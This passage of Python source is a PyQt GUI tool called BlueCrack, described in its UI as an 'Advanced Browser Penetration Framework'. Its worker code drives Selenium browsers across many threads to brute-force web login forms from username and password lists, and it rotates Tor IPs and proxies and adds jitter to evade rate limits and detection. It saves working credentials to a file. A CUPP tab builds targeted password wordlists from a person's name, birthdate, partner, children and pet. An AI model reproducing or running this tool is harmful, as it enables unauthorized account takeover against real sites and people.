            continue_after: bool = ctx.get("continue_after_success", False)

            # Retry budget: track retries per (user, pwd)
            retry_budget: Dict[Tuple[str, str], int] = {}
            retry_lock = threading.Lock()
            MAX_RETRIES_PER_COMBO: int = 3

            # Metrics
            metrics: Dict[str, int] = {
                "attempted": 0,
                "successes": 0,
                "failures": 0,
                "errors": 0,
                "rate_limit_hits": 0,
                "skipped_empty": 0,
                "skipped_solved_user": 0,
                "requeued": 0,
                "rate_retry_exhausted": 0,
            }
            metrics_lock = threading.Lock()
            self._start_time = time.time()

            q: Queue = Queue(maxsize=1000)

            def populate() -> None:
                for u in users:
                    for p in passwords:
                        q.put((u, p))

            threading.Thread(target=populate, daemon=True).start()

            # Setup driver for selector detection
            self.log("[*] Opening browser for selector setup...")
            setup_driver = create_driver_safe(webdriver.ChromeOptions())
            if setup_driver is None:
                self.finished_signal.emit(False, "Failed to create setup browser.")
                return

            try:
                setup_driver.get(ctx["target_url"])
                time.sleep(2)
                setup_driver.execute_script(CLICK_LISTENER_JS)
                setup_driver.execute_script(AUTO_DETECT_JS)
                detected = setup_driver.execute_script("return window._autoFindFields();")

                if detected and detected[0] and detected[1]:
                    ctx["username_selector"], ctx["password_selector"] = detected
                    self.log(f"[+] Auto-detected  User: {detected[0]}")
                    self.log(f"[+] Auto-detected  Pass: {detected[1]}")
                else:
                    self.log("[-] Auto-detect failed. Using keyboard fallback...")
                    self.log("    Click username field → press S")
                    self.log("    Click password field → press T")
                    while not (
                        ctx.get("username_selector") and ctx.get("password_selector")
                    ):
                        if self._stop_flag.is_set():
                            setup_driver.quit()
                            self.finished_signal.emit(False, "Stopped by user.")
                            return
                        if keyboard.is_pressed("s"):
                            elem = setup_driver.execute_script(
                                "return window._lastClicked"
                            )
                            if elem:
                                css = setup_driver.execute_script(CSS_PATH_JS, elem)
                                if css:
                                    ctx["username_selector"] = css
                                    self.log(f"[+] Username LOCKED: {css}")
                            time.sleep(0.3)
                        if keyboard.is_pressed("t"):
                            elem = setup_driver.execute_script(
                                "return window._lastClicked"
                            )
                            if elem:
                                css = setup_driver.execute_script(CSS_PATH_JS, elem)
                                if css:
                                    ctx["password_selector"] = css
                                    self.log(f"[+] Password LOCKED: {css}")
                            time.sleep(0.3)
                        time.sleep(0.1)
            except Exception as e:
                self.log(f"[-] Setup error: {e}")
                try:
                    setup_driver.quit()
                except Exception:
                    pass
                self.finished_signal.emit(False, str(e))
                return
            try:
                setup_driver.quit()
            except Exception:
                pass

            self.log(f"[*] Launching {ctx['threads']} worker thread(s)...")

            def _run_worker() -> None:
                options = build_chrome_options(ctx)
                wd = create_driver_safe(options)
                if wd is None:
                    self.log("[-] Thread startup error: could not create WebDriver")
                    return

                tor_counter: int = 0
                try:
                    while (
                        not q.empty()
                        and not self._stop_flag.is_set()
                        and not _GLOBAL_STOP.is_set()
                    ):
                        # Check max attempts
                        if max_attempts > 0:
                            with metrics_lock:
                                if metrics["attempted"] >= max_attempts:
                                    break

                        if not continue_after:
                            if not multiple_users and found_users:
                                break
                            # If single user and already found, stop
                        # Even with continue_after, skip already-solved users
                        # (unless continue_after is True in which case we still test all)

                        try:
                            user, pwd = q.get(timeout=1)
                        except Exception:
                            break

                        if not pwd or not pwd.strip():
                            with metrics_lock:
                                metrics["skipped_empty"] += 1
                            q.task_done()
                            continue

                        if not continue_after and user in found_users:
                            with metrics_lock:
                                metrics["skipped_solved_user"] += 1
                            done[0] += 1
                            self.progress_signal.emit(done[0], total)
                            q.task_done()
                            continue

                        tor_counter += 1
                        if (
                            ctx.get("use_tor")
                            and ctx.get("tor_shift_every", 0) > 0
                            and tor_counter % ctx["tor_shift_every"] == 0
                        ):
                            self.log("[~] Shifting Tor IP...")
                            change_tor_ip(ctx.get("tor_port", 9051))
                            time.sleep(2)

                        try:
                            delay = ctx.get("delay", 0)
                            jitter = ctx.get("jitter", 0)
                            if jitter > 0:
                                delay += random.uniform(0, jitter)
                            if delay > 0:
                                time.sleep(delay)

                            wd.get(ctx["target_url"])
                            wait = WebDriverWait(wd, 5)
                            u_el = wait.until(
                                EC.presence_of_element_located(
                                    (By.CSS_SELECTOR, ctx["username_selector"])
                                )
                            )
                            p_el = wait.until(
                                EC.presence_of_element_located(
                                    (By.CSS_SELECTOR, ctx["password_selector"])
                                )
                            )

                            u_el.clear()
                            u_el.send_keys(user)
                            p_el.clear()
                            p_el.send_keys(pwd)
                            p_el.send_keys(Keys.ENTER)

                            with metrics_lock:
                                metrics["attempted"] += 1

                            self.log(f"[*] Trying: {user} / {pwd}")
                            time.sleep(1)

                            src = ""
                            try:
                                src = wd.page_source.lower()
                            except Exception:
                                pass

                            current_url = ""
                            try:
                                current_url = wd.current_url
                            except Exception:
                                pass

                            # Rate limit check
                            if ctx.get("limit_text") and ctx["limit_text"] in src:
                                self.log("[!] Rate limit hit!")
                                with metrics_lock:
                                    metrics["rate_limit_hits"] += 1

                                # Check retry budget for rate limit
                                combo_key = (user, pwd)
                                with retry_lock:
                                    retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                    budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO

                                if budget_exceeded:
                                    self.log(f"[!] Retry budget exhausted for {user}/{pwd}")
                                    with metrics_lock:
                                        metrics["rate_retry_exhausted"] += 1
                                    done[0] += 1
                                    self.progress_signal.emit(done[0], total)
                                    q.task_done()
                                    continue

                                if ctx.get("use_tor"):
                                    change_tor_ip(ctx.get("tor_port", 9051))
                                    time.sleep(3)
                                elif ctx.get("cooldown", 0) > 0:
                                    time.sleep(ctx["cooldown"])

                                q.put((user, pwd))
                                with metrics_lock:
                                    metrics["requeued"] += 1
                                q.task_done()
                                self._emit_metrics(metrics)
                                continue

                            # Error text check
                            if ctx.get("error_msg") and ctx["error_msg"] in src:
                                with metrics_lock:
                                    metrics["failures"] += 1
                                done[0] += 1
                                self.progress_signal.emit(done[0], total)
                                q.task_done()
                                self._emit_metrics(metrics)
                                continue

                            # Determine success
                            is_success = False
                            if success_msg:
                                if success_msg in src:
                                    is_success = True
                            elif current_url and current_url != ctx["target_url"] and "login" not in current_url.lower():
                                is_success = True
                            elif ctx.get("error_msg"):
                                # Error message not found = potential success
                                is_success = True

                            if is_success:
                                with _found_lock:
                                    found_users.add(user)
                                    found_creds.append((user, pwd))
                                self.log(f"\n[+] VALID CREDENTIALS: {user} / {pwd}")
                                with metrics_lock:
                                    metrics["successes"] += 1
                                try:
                                    with open("credentials.txt", "a", encoding="utf-8") as cf:
                                        cf.write(f"{ctx['target_url']} - {user}:{pwd}\n")
                                except Exception:
                                    pass

                                done[0] += 1
                                self.progress_signal.emit(done[0], total)
                                q.task_done()
                                self._emit_metrics(metrics)

                                if not continue_after and not multiple_users:
                                    with q.mutex:
                                        q.queue.clear()
                                    break

                                # Restart browser for clean state
                                try:
                                    wd.quit()
                                except Exception:
                                    pass
                                wd = create_driver_safe(options)
                                if wd is None:
                                    self.log("[-] Could not restart browser after success")
                                    break
                                continue
                            else:
                                # Ambiguous — count as failure
                                with metrics_lock:
                                    metrics["failures"] += 1

                            done[0] += 1
                            self.progress_signal.emit(done[0], total)
                            q.task_done()
                            self._emit_metrics(metrics)

                        except (NoSuchElementException, TimeoutException):
                            self.log(f"[-] Missing elements for {user}, retrying...")
                            combo_key = (user, pwd)
                            with retry_lock:
                                retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO

                            if not budget_exceeded:
                                q.put((user, pwd))
                                with metrics_lock:
                                    metrics["requeued"] += 1
                            else:
                                with metrics_lock:
                                    metrics["rate_retry_exhausted"] += 1
                                done[0] += 1
                                self.progress_signal.emit(done[0], total)

                            q.task_done()
                            with metrics_lock:
                                metrics["errors"] += 1
                            try:
                                wd.quit()
                            except Exception:
                                pass
                            wd = create_driver_safe(options)
                            if wd is None:
                                self.log("[-] Could not recreate browser, thread exiting")
                                break

                        except Exception as e:
                            combo_key = (user, pwd)
                            with retry_lock:
                                retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO

                            if not budget_exceeded:
                                q.put((user, pwd))
                                with metrics_lock:
                                    metrics["requeued"] += 1
                            else:
                                with metrics_lock:
                                    metrics["rate_retry_exhausted"] += 1
                                done[0] += 1
                                self.progress_signal.emit(done[0], total)

                            q.task_done()
                            msg = str(e).lower()
                            if not any(
                                k in msg
                                for k in (
                                    "invalid session id",
                                    "detached",
                                    "out of memory",
                                    "no such window",
                                )
                            ):
                                self.log(f"[-] Error trying {user}: {e}")
                            with metrics_lock:
                                metrics["errors"] += 1
                            try:
                                wd.quit()
                            except Exception:
                                pass
                            wd = create_driver_safe(options)
                            if wd is None:
                                self.log("[-] Could not recreate browser, thread exiting")
                                break
                finally:
                    try:
                        if wd:
                            wd.quit()
                    except Exception:
                        pass

            threads_list: List[threading.Thread] = []
            for _ in range(ctx["threads"]):
                t = threading.Thread(target=_run_worker, daemon=True)
                t.start()
                threads_list.append(t)
            for t in threads_list:
                t.join()

            end_time = time.time()
            self._emit_metrics(metrics)

            # Auto-save JSON report
            _save_json_report(
                "bluecrack_gui_report.json",
                ctx["target_url"],
                metrics,
                found_creds,
                self._start_time,
                end_time,
            )

            if found_users:
                saved_msg = f"Valid credentials found for {len(found_users)} user(s)! Saved to credentials.txt"
                self.finished_signal.emit(True, saved_msg)
            elif self._stop_flag.is_set() or _GLOBAL_STOP.is_set():
                self.finished_signal.emit(False, "Stopped by user.")
            else:
                self.finished_signal.emit(False, "No valid credentials found.")

        def _emit_metrics(self, metrics: Dict[str, int]) -> None:
            """Emit a copy of the current metrics to the GUI."""
            m = dict(metrics)
            m["elapsed"] = time.time() - self._start_time if self._start_time else 0
            self.metrics_signal.emit(m)

    # ─────────────────── CUPP Worker Thread ───────────────────
    class CuppWorkerThread(QThread):
        """Worker thread for CUPP password profile generation."""

        log_signal = pyqtSignal(str)
        finished_signal = pyqtSignal(str)  # path to generated file

        def __init__(self, profile: Dict[str, Any]) -> None:
            super().__init__()
            self.profile: Dict[str, Any] = profile

        def run(self) -> None:
            """Generate a CUPP wordlist from the given profile."""
            try:
                if _cupp_mod is None:
                    self.log_signal.emit("[-] cupp.py not found in directory.")
                    self.finished_signal.emit("")
                    return
                _cupp_mod.read_config(os.path.join(_cupp_dir, "cupp.cfg"))
                self.log_signal.emit("[*] Generating CUPP wordlist...")
                p = self.profile
                p.setdefault("spechars1", "n")
                p.setdefault("randnum", "n")
                p.setdefault("leetmode", "n")

                # Mock builtins.input to prevent CUPP from hanging
                original_input = builtins.input
                builtins.input = lambda prompt="": "n"
                try:
                    _cupp_mod.generate_wordlist_from_profile(p)
                finally:
                    builtins.input = original_input

                outfile = p["name"] + ".txt"
                if os.path.exists(outfile):
                    with open(outfile) as f:
                        cnt = sum(1 for _ in f)
                    self.log_signal.emit(
                        f"[+] CUPP done! {cnt} passwords → {outfile}"
                    )
                    self.finished_signal.emit(os.path.abspath(outfile))
                else:
                    self.log_signal.emit("[-] CUPP generated no output.")
                    self.finished_signal.emit("")
            except Exception as e:
                self.log_signal.emit(f"[-] CUPP error: {e}")
                self.finished_signal.emit("")

    # ─────────────────── Main GUI Window ───────────────────
    class BlueCrackGUI(QWidget):
        """Main BlueCrack GUI window with tabbed interface and live stats."""

        def __init__(self) -> None:
            super().__init__()
            self.worker_thread: Optional[GuiWorkerThread] = None
            self._cupp_thread: Optional[CuppWorkerThread] = None
            self._cupp_result_path: str = ""
            self._attack_start_time: float = 0.0
            self._is_dark: bool = True
            self.setWindowTitle("BlueCrack")
            self.setMinimumSize(960, 780)
            self._build_ui()

        def _build_ui(self) -> None:
            """Construct the entire GUI layout with premium styling."""
            root = QVBoxLayout(self)
            root.setContentsMargins(18, 14, 18, 14)
            root.setSpacing(12)

            # ── Header Frame ──
            header_frame = QFrame()
            header_frame.setStyleSheet(
                "QFrame { background: transparent; border: none; }"
            )
            header_layout = QHBoxLayout(header_frame)
            header_layout.setContentsMargins(0, 0, 0, 4)

            title_col = QVBoxLayout()
            title_col.setSpacing(2)
            title = QLabel("BLUECRACK")
            title.setObjectName("titleLabel")
            title.setAlignment(Qt.AlignmentFlag.AlignLeft)
            sub = QLabel("Advanced Browser Penetration Framework")
            sub.setObjectName("subtitleLabel")
            sub.setAlignment(Qt.AlignmentFlag.AlignLeft)
            title_col.addWidget(title)
            title_col.addWidget(sub)
            header_layout.addLayout(title_col, stretch=1)

            self.theme_btn = QPushButton("☼")
            self.theme_btn.setObjectName("themeBtn")
            self.theme_btn.setFixedSize(36, 36)
            self.theme_btn.setToolTip("Toggle light/dark theme")
            self.theme_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.theme_btn.clicked.connect(self._toggle_theme)
            header_layout.addWidget(
                self.theme_btn, alignment=Qt.AlignmentFlag.AlignTop
            )
            root.addWidget(header_frame)

            # ── Splitter: Tabs on top, Log on bottom ──
            self.splitter = QSplitter(Qt.Orientation.Vertical)

            # ── Tabs ──
            self.tabs = QTabWidget()

            # ═══ TAB 1 : DASHBOARD (Target, Engine, Network, Limits side-by-side) ═══
            dash_scroll = QScrollArea()
            dash_scroll.setWidgetResizable(True)
            dash_scroll.setFrameShape(QFrame.Shape.NoFrame)
            
            dash_w = QWidget()
            dash_layout = QHBoxLayout(dash_w)
            dash_layout.setContentsMargins(12, 12, 12, 12)
            dash_layout.setSpacing(16)

            # Left Column of Dashboard
            left_col = QVBoxLayout()
            left_col.setSpacing(12)

            # Left Card 1: Target Configuration
            tgt_grp = QGroupBox("TARGET CONFIGURATION")
            tgt_f = QFormLayout(tgt_grp)
            tgt_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            tgt_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            tgt_f.setHorizontalSpacing(10)
            tgt_f.setVerticalSpacing(8)
            tgt_f.setContentsMargins(10, 10, 10, 10)

            self.url_in = QLineEdit()
            self.url_in.setPlaceholderText("https://target.com/login")
            self.url_in.setToolTip("The full URL of the login page to attack")
            tgt_f.addRow("URL:", self.url_in)

            user_row = QHBoxLayout()
            user_row.setSpacing(6)
            self.user_in = QLineEdit()
            self.user_in.setPlaceholderText("admin  or  path/to/users.txt")
            self.user_in.setToolTip("A single username OR path to a file with one username per line")
            user_btn = QPushButton("...")
            user_btn.setFixedWidth(36)
            user_btn.setToolTip("Browse for username list file")
            user_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            user_btn.clicked.connect(lambda: self._pick_file(self.user_in))
            user_row.addWidget(self.user_in)
            user_row.addWidget(user_btn)
            tgt_f.addRow("USER LIST:", user_row)

            pass_row = QHBoxLayout()
            pass_row.setSpacing(6)
            self.pass_in = QLineEdit()
            self.pass_in.setPlaceholderText("password  or  path/to/pass.txt")
            self.pass_in.setToolTip("A single password OR path to a file with one password per line")
            pass_btn = QPushButton("...")
            pass_btn.setFixedWidth(36)
            pass_btn.setToolTip("Browse for password list file")
            pass_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            pass_btn.clicked.connect(lambda: self._pick_file(self.pass_in))
            pass_row.addWidget(self.pass_in)
            pass_row.addWidget(pass_btn)
            tgt_f.addRow("PASS LIST:", pass_row)
            left_col.addWidget(tgt_grp)

            # Left Card 2: Bypass & Proxy
            net_grp = QGroupBox("BYPASS & PROXY")
            net_f = QFormLayout(net_grp)
            net_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            net_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            net_f.setHorizontalSpacing(10)
            net_f.setVerticalSpacing(8)
            net_f.setContentsMargins(10, 10, 10, 10)

            self.tor_cb = QCheckBox("Route through Tor (socks5://127.0.0.1:9050)")
            self.tor_cb.setToolTip("Route all traffic through the Tor network for anonymity")

            self.tor_port_in = QSpinBox()
            self.tor_port_in.setRange(1024, 65535)
            self.tor_port_in.setValue(9051)
            self.tor_port_in.setToolTip("Tor control port for requesting new identities")

            self.tor_every_in = QSpinBox()
            self.tor_every_in.setRange(0, 9999)
            self.tor_every_in.setValue(10)
            self.tor_every_in.setToolTip("Shift Tor IP every N attempts. 0 = never shift.")

            self.proxy_in = QLineEdit()
            self.proxy_in.setPlaceholderText("http://ip:port  or  path/to/proxies.txt")
            self.proxy_in.setToolTip("A single proxy URL or path to a file with one proxy per line")
            proxy_btn = QPushButton("...")
            proxy_btn.setFixedWidth(36)
            proxy_btn.setToolTip("Browse for proxy list file")
            proxy_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            proxy_btn.clicked.connect(lambda: self._pick_file(self.proxy_in))
            proxy_row = QHBoxLayout()
            proxy_row.setSpacing(6)
            proxy_row.addWidget(self.proxy_in)
            proxy_row.addWidget(proxy_btn)

            net_f.addRow("", self.tor_cb)
            net_f.addRow("TOR PORT:", self.tor_port_in)
            net_f.addRow("SHIFT IP:", self.tor_every_in)
            net_f.addRow("PROXIES:", proxy_row)
            left_col.addWidget(net_grp)
            
            left_col.addStretch()

            # Right Column of Dashboard
            right_col = QVBoxLayout()
            right_col.setSpacing(12)

            # Right Card 1: Attack Engine Options
            eng_grp = QGroupBox("ENGINE OPTIONS")
            eng_f = QFormLayout(eng_grp)
            eng_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            eng_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            eng_f.setHorizontalSpacing(10)
            eng_f.setVerticalSpacing(8)
            eng_f.setContentsMargins(10, 10, 10, 10)

            self.threads_in = QSpinBox()
            self.threads_in.setRange(1, 50)
            self.threads_in.setValue(1)
            self.threads_in.setToolTip("Number of parallel browser threads (more = faster but heavier)")

            self.delay_in = QDoubleSpinBox()
            self.delay_in.setRange(0, 120)
            self.delay_in.setSingleStep(0.5)
            self.delay_in.setToolTip("Base delay in seconds between each login attempt")

            self.jitter_in = QDoubleSpinBox()
            self.jitter_in.setRange(0, 30)
            self.jitter_in.setSingleStep(0.5)
            self.jitter_in.setToolTip("Random jitter added to delay to avoid pattern detection")

            self.err_in = QLineEdit("incorrect")
            self.err_in.setPlaceholderText("error text on failed login")
            self.err_in.setToolTip("Text that appears on the page when a login fails (e.g. 'invalid password')")

            self.limit_in = QLineEdit(DEFAULT_LIMIT_TEXT)
            self.limit_in.setToolTip("Text indicating the server is rate-limiting requests")

            self.cooldown_in = QSpinBox()
            self.cooldown_in.setRange(0, 300)
            self.cooldown_in.setValue(12)
            self.cooldown_in.setToolTip("Seconds to wait when a rate limit is detected before retrying")

            self.headless_cb = QCheckBox("Headless mode (no visible browser window)")
            self.headless_cb.setChecked(True)
            self.headless_cb.setToolTip("Run browsers without visible windows — faster but no visual feedback")

            eng_f.addRow("THREADS:", self.threads_in)
            eng_f.addRow("DELAY (S):", self.delay_in)
            eng_f.addRow("JITTER (S):", self.jitter_in)
            eng_f.addRow("ERROR TEXT:", self.err_in)
            eng_f.addRow("LIMIT TEXT:", self.limit_in)
            eng_f.addRow("COOLDOWN:", self.cooldown_in)
            eng_f.addRow("", self.headless_cb)
            right_col.addWidget(eng_grp)

            # Right Card 2: Advanced Limits
            adv_grp = QGroupBox("ADVANCED LIMITS")
            adv_f = QFormLayout(adv_grp)
            adv_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            adv_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            adv_f.setHorizontalSpacing(10)
            adv_f.setVerticalSpacing(8)
            adv_f.setContentsMargins(10, 10, 10, 10)

            self.success_in = QLineEdit()
            self.success_in.setPlaceholderText("e.g. 'Welcome back' or 'Dashboard'")
            self.success_in.setToolTip("Text that confirms a successful login. If set, login is only valid when this text appears.")

            self.max_attempts_in = QSpinBox()
            self.max_attempts_in.setRange(0, 999999)
            self.max_attempts_in.setValue(0)
            self.max_attempts_in.setToolTip("Maximum total attempts before stopping (0 = unlimited)")

            self.continue_cb = QCheckBox("Continue after success")
            self.continue_cb.setToolTip("If checked, the attack continues even after finding valid credentials")

            adv_f.addRow("SUCCESS TXT:", self.success_in)
            adv_f.addRow("MAX ATTEMPTS:", self.max_attempts_in)
            adv_f.addRow("", self.continue_cb)
            right_col.addWidget(adv_grp)
            
            right_col.addStretch()

            dash_layout.addLayout(left_col, stretch=1)
            dash_layout.addLayout(right_col, stretch=1)
            
            dash_scroll.setWidget(dash_w)
            self.tabs.addTab(dash_scroll, "DASHBOARD")

            # ═══ TAB 2 : CUPP (Common User Passwords Profiler) ═══
            cupp_scroll = QScrollArea()
            cupp_scroll.setWidgetResizable(True)
            cupp_scroll.setFrameShape(QFrame.Shape.NoFrame)
            
            cupp_w = QWidget()
            cupp_layout = QVBoxLayout(cupp_w)
            cupp_layout.setContentsMargins(12, 12, 12, 12)
            cupp_layout.setSpacing(12)

            columns_layout = QHBoxLayout()
            columns_layout.setSpacing(16)

            # Column 1: Target details
            col1_grp = QGroupBox("TARGET DETAILS")
            col1_f = QFormLayout(col1_grp)
            col1_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            col1_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            col1_f.setHorizontalSpacing(10)
            col1_f.setVerticalSpacing(8)
            col1_f.setContentsMargins(10, 10, 10, 10)

            self.cupp_name = QLineEdit()
            self.cupp_name.setPlaceholderText("Required")
            self.cupp_name.setToolTip("Target's first name (required for CUPP)")
            self.cupp_surname = QLineEdit()
            self.cupp_surname.setToolTip("Target's surname / last name")
            self.cupp_nick = QLineEdit()
            self.cupp_nick.setToolTip("Target's nickname or alias")
            self.cupp_bday = QLineEdit()
            self.cupp_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_bday.setToolTip("Target's birthdate in DDMMYYYY format")
            self.cupp_company = QLineEdit()
            self.cupp_company.setToolTip("Target's company or employer name")
            self.cupp_keywords = QLineEdit()
            self.cupp_keywords.setPlaceholderText("hacker,juice,black")
            self.cupp_keywords.setToolTip("Comma-separated keywords related to the target")

            self.cupp_specchars = QCheckBox("Add special chars")
            self.cupp_specchars.setToolTip("Append special characters to generated passwords")
            self.cupp_randnum = QCheckBox("Add random numbers")
            self.cupp_randnum.setToolTip("Append random numbers to generated passwords")
            self.cupp_leet = QCheckBox("Leet mode (1337)")
            self.cupp_leet.setToolTip("Convert letters to leet-speak equivalents")

            col1_f.addRow("FIRST NAME *:", self.cupp_name)
            col1_f.addRow("SURNAME:", self.cupp_surname)
            col1_f.addRow("NICKNAME:", self.cupp_nick)
            col1_f.addRow("BIRTHDATE:", self.cupp_bday)
            col1_f.addRow("COMPANY:", self.cupp_company)
            col1_f.addRow("KEYWORDS:", self.cupp_keywords)
            col1_f.addRow("", self.cupp_specchars)
            col1_f.addRow("", self.cupp_randnum)
            col1_f.addRow("", self.cupp_leet)

            # Column 2: Relations
            col2_grp = QGroupBox("RELATIONS & FAMILY")
            col2_f = QFormLayout(col2_grp)
            col2_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            col2_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            col2_f.setHorizontalSpacing(10)
            col2_f.setVerticalSpacing(8)
            col2_f.setContentsMargins(10, 10, 10, 10)

            self.cupp_partner = QLineEdit()
            self.cupp_partner.setToolTip("Name of target's partner/spouse")
            self.cupp_partner_nick = QLineEdit()
            self.cupp_partner_nick.setToolTip("Partner's nickname")
            self.cupp_partner_bday = QLineEdit()
            self.cupp_partner_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_partner_bday.setToolTip("Partner's birthdate in DDMMYYYY format")
            self.cupp_child = QLineEdit()
            self.cupp_child.setToolTip("Name of target's child")
            self.cupp_child_nick = QLineEdit()
            self.cupp_child_nick.setToolTip("Child's nickname")
            self.cupp_child_bday = QLineEdit()
            self.cupp_child_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_child_bday.setToolTip("Child's birthdate in DDMMYYYY format")
            self.cupp_pet = QLineEdit()
            self.cupp_pet.setToolTip("Name of target's pet")

            col2_f.addRow("PARTNER NAME:", self.cupp_partner)
            col2_f.addRow("PARTNER NICK:", self.cupp_partner_nick)
            col2_f.addRow("PARTNER BDAY:", self.cupp_partner_bday)
            col2_f.addRow("CHILD NAME:", self.cupp_child)
            col2_f.addRow("CHILD NICK:", self.cupp_child_nick)
            col2_f.addRow("CHILD BDAY:", self.cupp_child_bday)
            col2_f.addRow("PET NAME:", self.cupp_pet)

            # Column 3: Number Sequence
            col3_grp = QGroupBox("NUMBER SEQUENCE")
            col3_f = QFormLayout(col3_grp)
            col3_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            col3_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            col3_f.setHorizontalSpacing(10)
            col3_f.setVerticalSpacing(8)
            col3_f.setContentsMargins(10, 10, 10, 10)

            self.seq_prefix = QLineEdit()
            self.seq_prefix.setPlaceholderText("Prefix (optional)")
            self.seq_prefix.setToolTip("Text prepended before each number")
            self.seq_start = QSpinBox()
            self.seq_start.setRange(0, 999999999)
            self.seq_start.setValue(2015000)
            self.seq_start.setToolTip("Starting number of the sequence")
            self.seq_end = QSpinBox()
            self.seq_end.setRange(0, 999999999)
            self.seq_end.setValue(2015100)
            self.seq_end.setToolTip("Ending number of the sequence (inclusive)")
            self.seq_pad = QSpinBox()
            self.seq_pad.setRange(0, 20)
            self.seq_pad.setToolTip("Pad numbers with leading zeros to this width")
            self.seq_suffix = QLineEdit()
            self.seq_suffix.setPlaceholderText("Suffix (optional)")
            self.seq_suffix.setToolTip("Text appended after each number")

            col3_f.addRow("PREFIX:", self.seq_prefix)
            col3_f.addRow("START:", self.seq_start)
            col3_f.addRow("END:", self.seq_end)
            col3_f.addRow("PADDING:", self.seq_pad)
            col3_f.addRow("SUFFIX:", self.seq_suffix)

            columns_layout.addWidget(col1_grp, stretch=1)
            columns_layout.addWidget(col2_grp, stretch=1)
            columns_layout.addWidget(col3_grp, stretch=1)
            cupp_layout.addLayout(columns_layout)

            cupp_btns = QHBoxLayout()
            cupp_btns.setSpacing(10)

            self.cupp_gen_btn = QPushButton("GENERATE PROFILE")
            self.cupp_gen_btn.setObjectName("cuppGenBtn")
            self.cupp_gen_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.cupp_gen_btn.clicked.connect(self._run_cupp)

            self.seq_gen_btn = QPushButton("GENERATE SEQUENCE")
            self.seq_gen_btn.setObjectName("seqGenBtn")
            self.seq_gen_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.seq_gen_btn.clicked.connect(self._run_sequence)

            self.cupp_use_btn = QPushButton("USE AS PASSWORD LIST")
            self.cupp_use_btn.setEnabled(False)
            self.cupp_use_btn.setObjectName("cuppUseBtn")
            self.cupp_use_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.cupp_use_btn.clicked.connect(self._use_cupp_result)

            cupp_btns.addWidget(self.cupp_gen_btn)
            cupp_btns.addWidget(self.seq_gen_btn)
            cupp_btns.addWidget(self.cupp_use_btn)

            cupp_layout.addLayout(cupp_btns)
            cupp_layout.addStretch()

            cupp_scroll.setWidget(cupp_w)
            self.tabs.addTab(cupp_scroll, "CUPP")

            self.splitter.addWidget(self.tabs)

            # ── Log area ──
            self.log_txt = QTextEdit()
            self.log_txt.setReadOnly(True)
            self.log_txt.setMinimumHeight(120)
            self.splitter.addWidget(self.log_txt)

            self.splitter.setStretchFactor(0, 3)
            self.splitter.setStretchFactor(1, 1)
            root.addWidget(self.splitter, stretch=1)

            # ═══ Bottom Controls ═══
            ctrl_row = QHBoxLayout()
            ctrl_row.setSpacing(10)

            self.start_btn = QPushButton("START ATTACK")
            self.start_btn.setObjectName("startBtn")
            self.start_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.start_btn.clicked.connect(self._start_attack)

            self.stop_btn = QPushButton("STOP")
            self.stop_btn.setObjectName("stopBtn")
            self.stop_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.stop_btn.setEnabled(False)
            self.stop_btn.clicked.connect(self._stop_attack)

            self.clear_btn = QPushButton("CLEAR LOG")
            self.clear_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.clear_btn.setToolTip("Clear all log output")
            self.clear_btn.clicked.connect(lambda: self.log_txt.clear())

            self.export_btn = QPushButton("EXPORT LOG")
            self.export_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            self.export_btn.setToolTip("Save the current log contents to a file")
            self.export_btn.clicked.connect(self._export_log)

            ctrl_row.addWidget(self.start_btn)
            ctrl_row.addWidget(self.stop_btn)
            ctrl_row.addStretch()
            ctrl_row.addWidget(self.export_btn)
            ctrl_row.addWidget(self.clear_btn)
            root.addLayout(ctrl_row)

            # ── Progress Bar ──
            self.progress = QProgressBar()
            self.progress.setValue(0)
            root.addWidget(self.progress)

            # ── Live Stats Footer ──
            footer_frame = QFrame()
            footer_frame.setObjectName("footerFrame")
            footer_layout = QHBoxLayout(footer_frame)
            footer_layout.setContentsMargins(0, 0, 0, 0)
            footer_layout.setSpacing(12)

            def _make_stat_box(title: str, default_val: str) -> Tuple[QFrame, QLabel]:
                frame = QFrame()
                frame.setObjectName("statBox")
                box_layout = QVBoxLayout(frame)
                box_layout.setContentsMargins(8, 8, 8, 8)
                box_layout.setSpacing(4)

                lbl = QLabel(title.upper())
                lbl.setObjectName("statLabel")
                lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

                val = QLabel(default_val)
                val.setObjectName("statValue")
                val.setAlignment(Qt.AlignmentFlag.AlignCenter)

                box_layout.addWidget(lbl)
